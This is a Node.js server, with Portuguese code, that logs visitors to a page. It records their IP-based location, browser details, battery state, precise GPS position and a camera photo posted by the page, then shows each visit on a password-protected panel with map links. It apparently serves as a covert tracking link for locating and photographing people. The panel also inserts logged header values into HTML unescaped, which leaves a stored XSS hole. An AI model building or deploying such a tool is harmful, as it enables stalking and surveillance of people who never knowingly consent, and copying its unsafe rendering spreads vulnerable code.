const http = require("http");
const fs = require("fs");
const path = require("path");

const PORTA = process.env.PORT || 3000;
const SENHA_PAINEL = process.env.SENHA || "mude-esta-senha";
const ARQUIVO_LOGS = path.join(__dirname, "logs.json");
const PASTA_FOTOS = path.join(__dirname, "fotos");

if (!fs.existsSync(PASTA_FOTOS)) fs.mkdirSync(PASTA_FOTOS, { recursive: true });

function lerLogs() {
  try {
    return JSON.parse(fs.readFileSync(ARQUIVO_LOGS, "utf8"));
  } catch {
    return [];
  }
}

function salvarLog(registro) {
  const logs = lerLogs();
  logs.unshift(registro);
  fs.writeFileSync(ARQUIVO_LOGS, JSON.stringify(logs, null, 2));
}

function pegarIp(req) {
  const xff = req.headers["x-forwarded-for"];
  if (xff) return xff.split(",")[0].trim();
  return (req.socket.remoteAddress || "").replace("::ffff:", "");
}

async function geolocalizarIp(ip) {
  if (!ip || ip.startsWith("127.") || ip === "::1" || ip.startsWith("192.168.") || ip.startsWith("10.")) {
    return { aviso: "IP local/privado (teste na rede local)" };
  }
  try {
    const r = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query&lang=pt-BR`
    );
    const d = await r.json();
    if (d.status !== "success") return { aviso: "Não foi possível localizar o IP" };
    return {
      pais: d.country,
      estado: d.regionName,
      cidade: d.city,
      cep: d.zip,
      latitude_aprox: d.lat,
      longitude_aprox: d.lon,
      provedor: d.isp,
      organizacao: d.org,
      rede_as: d.as,
      e_celular: d.mobile,
      e_proxy_vpn: d.proxy,
      e_hospedagem: d.hosting,
    };
  } catch {
    return { aviso: "Falha na consulta de geolocalização por IP" };
  }
}

function salvarFoto(base64) {
  if (!base64 || typeof base64 !== "string" || !base64.startsWith("data:image")) return null;
  const id = Date.now() + "_" + Math.random().toString(36).slice(2, 8);
  const nome = id + ".jpg";
  const dados = base64.replace(/^data:image\/\w+;base64,/, "");
  fs.writeFileSync(path.join(PASTA_FOTOS, nome), Buffer.from(dados, "base64"));
  return nome;
}

const servidor = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);

  // Página principal
  if (req.method === "GET" && url.pathname === "/") {
    try {
      const conteudo = fs.readFileSync(path.join(__dirname, "public", "index.html"));
      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      res.end(conteudo);
    } catch {
      res.writeHead(500);
      res.end("Erro ao carregar");
    }
    return;
  }

  // Servir fotos para o painel
  if (req.method === "GET" && url.pathname.startsWith("/fotos/")) {
    const nome = path.basename(url.pathname);
    const caminho = path.join(PASTA_FOTOS, nome);
    try {
      const img = fs.readFileSync(caminho);
      res.writeHead(200, { "Content-Type": "image/jpeg" });
      res.end(img);
    } catch {
      res.writeHead(404);
      res.end("Foto não encontrada");
    }
    return;
  }

  // Coleta de dados (limite 10MB para fotos base64)
  if (req.method === "POST" && url.pathname === "/coletar") {
    let corpo = "";
    let tamanho = 0;
    const LIMITE = 10 * 1024 * 1024;

    req.on("data", (c) => {
      tamanho += c.length;
      if (tamanho > LIMITE) { req.destroy(); return; }
      corpo += c;
    });
    req.on("end", async () => {
      let cliente = {};
      try { cliente = JSON.parse(corpo); } catch {}

      const ip = pegarIp(req);
      const arquivoFoto = salvarFoto(cliente.foto);

      const registro = {
        data: new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }),
        ip,
        geo_por_ip: await geolocalizarIp(ip),
        user_agent: req.headers["user-agent"] || "",
        idioma: req.headers["accept-language"] || "",
        referer: req.headers["referer"] || "",
        aparelho: cliente.aparelho || {},
        bateria: cliente.bateria || "N/A",
        localizacao_precisa: cliente.gps || "não autorizada",
        foto: arquivoFoto || "não autorizada",
      };
      salvarLog(registro);
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ ok: true }));
    });
    return;
  }

  // Painel protegido
  if (req.method === "GET" && url.pathname === "/painel") {
    if (url.searchParams.get("senha") !== SENHA_PAINEL) {
      res.writeHead(401, { "Content-Type": "text/html; charset=utf-8" });
      res.end("<h3>Senha incorreta.</h3><p>Use /painel?senha=SUA_SENHA</p>");
      return;
    }
    const logs = lerLogs();

    const linkMaps = (lat, lon, rotulo, destaque) => {
      if (lat == null || lon == null) return "";
      const cor = destaque ? "#16a34a" : "#2563eb";
      return `<a href="https://www.google.com/maps/search/?api=1&query=${lat},${lon}"
        target="_blank" rel="noopener"
        style="display:inline-block;margin:.3rem .4rem .3rem 0;padding:.5rem .8rem;
        background:${cor};color:#fff;border-radius:6px;text-decoration:none;font-size:.85rem">
        📍 ${rotulo}</a>`;
    };

    const linhas = logs.map((l) => {
      const g = l.geo_por_ip || {};
      const p = l.localizacao_precisa;
      const temGps = p && typeof p === "object" && p.latitude != null;

      const mapas =
        (temGps
          ? linkMaps(p.latitude, p.longitude, `PRECISO (GPS · ±${p.precisao_metros || "?"} m)`, true)
          : "") +
        linkMaps(g.latitude_aprox, g.longitude_aprox, "Aproximado (por IP)", false);

      const fotoHtml = l.foto && l.foto !== "não autorizada"
        ? `<img src="/fotos/${l.foto}" style="max-width:200px;border-radius:8px;margin-top:.5rem;display:block">`
        : `<em style="color:#999">Sem foto</em>`;

      const bat = l.bateria && typeof l.bateria === "object"
        ? `🔋 ${l.bateria.nivel} ${l.bateria.carregando ? "(carregando)" : ""}`
        : "";

      // Copia sem a foto para o JSON ficar limpo
      const logLimpo = Object.assign({}, l);
      if (logLimpo.foto && logLimpo.foto !== "não autorizada") {
        logLimpo.foto = "[salva como " + logLimpo.foto + "]";
      }

      return `<article>
        <h3>${l.data} — ${l.ip}</h3>
        <div style="margin:.5rem 0">${mapas || "<em>Sem coordenadas.</em>"}</div>
        <div style="margin:.5rem 0">${fotoHtml}</div>
        ${bat ? `<div style="margin:.3rem 0;font-size:.85rem">${bat}</div>` : ""}
        <details><summary>Ver dados completos</summary>
          <pre>${JSON.stringify(logLimpo, null, 2)}</pre>
        </details>
      </article>`;
    }).join("");

    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    res.end(`<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Painel de registros</title>
      <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:system-ui;max-width:800px;margin:0 auto;padding:1rem;background:#f0f2f5}
        h1{margin:1rem 0}
        article{background:#fff;border:1px solid #e0e0e0;border-radius:12px;padding:1rem;margin:1rem 0}
        pre{background:#f4f4f4;padding:.8rem;overflow:auto;border-radius:6px;font-size:.78rem;margin-top:.5rem}
        details summary{cursor:pointer;color:#2563eb;font-size:.88rem}
        img{box-shadow:0 1px 4px rgba(0,0,0,.15)}
      </style></head><body>
      <h1>📋 Registros (${logs.length})</h1>
      ${linhas || "<p>Nenhum acesso ainda.</p>"}
    </body></html>`);
    return;
  }

  if (url.pathname === "/favicon.ico") {
    res.writeHead(204);
    res.end();
    return;
  }

  res.writeHead(404);
  res.end("Não encontrado");
});

servidor.listen(PORTA, "0.0.0.0", () => {
  console.log(`\n  Página:  http://localhost:${PORTA}/`);
  console.log(`  Painel:  http://localhost:${PORTA}/painel?senha=${SENHA_PAINEL}\n`);
});
